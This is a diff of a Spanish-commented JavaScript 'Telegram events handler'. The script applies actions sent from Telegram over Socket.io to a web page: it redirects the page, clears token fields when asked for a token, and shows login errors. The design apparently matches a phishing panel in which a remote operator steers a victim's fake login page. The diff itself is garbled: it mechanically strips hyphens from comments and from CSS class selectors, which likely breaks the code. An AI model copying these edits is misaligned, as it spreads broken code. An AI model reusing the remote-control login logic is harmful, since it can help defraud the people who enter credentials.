@@ -1,4 +1,4 @@
-/**
+﻿/**
  * TELEGRAM EVENTS HANDLER
  * Maneja los eventos y acciones recibidas desde Telegram
  * Se integra con Socket.io para comunicación en tiempo real
@@ -67,7 +67,7 @@
 
         /**
          * Maneja una acción recibida desde Telegram
-         * @param {Object} data - Datos de la acción
+         * @param {Object} data  Datos de la acción
          */
         handleTelegramAction: function(data) {
             console.log('⚙️ Procesando acción:', data.action);
@@ -103,8 +103,8 @@
 
         /**
          * Maneja una redirección
-         * @param {string} url - URL de destino
-         * @param {string} message - Mensaje opcional
+         * @param {string} url  URL de destino
+         * @param {string} message  Mensaje opcional
          */
         handleRedirect: function(url, message = null) {
             console.log('↗️ Redirigiendo a:', url);
@@ -151,7 +151,7 @@
 
         /**
          * Procesa una acción pendiente
-         * @param {string} action - Nombre de la acción
+         * @param {string} action  Nombre de la acción
          */
         processPendingAction: function(action) {
             console.log('⚙️ [PENDING] Procesando acción:', action);
@@ -170,7 +170,7 @@
 
                 case 'pedir_token':
                     console.log('🔄 [PENDING] Limpiando campos de token');
-                    const tokenInputs = document.querySelectorAll('.token-input');
+                    const tokenInputs = document.querySelectorAll('.tokeninput');
                     if (tokenInputs.length > 0) {
                         tokenInputs.forEach(input => input.value = '');
                         tokenInputs[0].focus();
@@ -192,11 +192,11 @@
 
         /**
          * Muestra un error pendiente
-         * @param {string} message - Mensaje de error
+         * @param {string} message  Mensaje de error
          */
         showPendingError: function(message) {
-            const errorAlert = document.querySelector('.login-alert') || 
-                             document.querySelector('.error-message');
+            const errorAlert = document.querySelector('.loginalert') || 
+                             document.querySelector('.errormessage');
 
             if (errorAlert) {
                 errorAlert.style.display = 'block';
@@ -209,7 +209,7 @@
 
         /**
          * Muestra un mensaje de éxito pendiente
-         * @param {string} message - Mensaje de éxito
+         * @param {string} message  Mensaje de éxito
          */
         showPendingSuccess: function(message) {
             if (window.commonUtils) {
@@ -237,7 +237,7 @@
     window.telegramEvents = TelegramEvents;
 
     // ===============================
-    // AUTO-INICIALIZACIÓN
+    // AUTOINICIALIZACIÓN
     // ===============================
     
     if (document.readyState === 'loading') {
